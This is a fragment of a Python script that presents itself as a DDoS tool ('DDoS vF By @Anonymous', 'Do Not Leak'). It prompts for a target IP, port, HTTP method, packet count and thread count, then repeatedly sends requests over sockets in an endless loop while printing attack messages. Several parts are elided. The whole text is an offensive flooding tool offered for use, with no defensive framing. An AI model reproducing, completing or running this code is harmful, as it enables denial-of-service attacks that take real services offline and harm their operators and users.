 ...
 `:`:::::::`;:::::: ;::::::#/               SDD
  ...
  `:::::`::::::::::::;'`:;::#                O
   `:::::`::::::::;' /  / `:#
    ::::::`:::::;'  /  /   `#
\033[35m                ╔═══════════════════════════════════════════════╗
\033[35m                ║\033[32m- - - - - - DDoS  vF By \033[36m@Anonymous \033[35m - - - - - -║
\033[35m                ║\033[32m- - - - - - Methods\033[36m\033[35m GET/POST/HEAD. - - - - - - ║
\033[35m                ╚════════════════════════════════════════╝
\033[31m
@Anonymous ════> Coded By Anonymous.
  
@Anonymous ════> Do Not Leak.
\033[0m                   
""")
ip = str(input("ip : "))
port = int(input("Port : "))
method_attack = str(input("Method (GET,POST,HEAD) : "))
times = int(input("Packet (10000) : "))
threads = int(input("Accept Packet (1000) : "))
...
def run():
    ...
    while True:
        try:
            ...
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            print(f"\033[0m @Anonymous Attack  ════>  to \033[1;35m{ip}\033[0m")
        except socket.error:
            s.close()
            print(f"\033[0m @Anonymous Attack  ════>  to \033[1;35m{ip}\033[0m")
            print(f"\033[0m @Anonymous Attack  ════>  to \033[1;35m{ip}\033[0m")
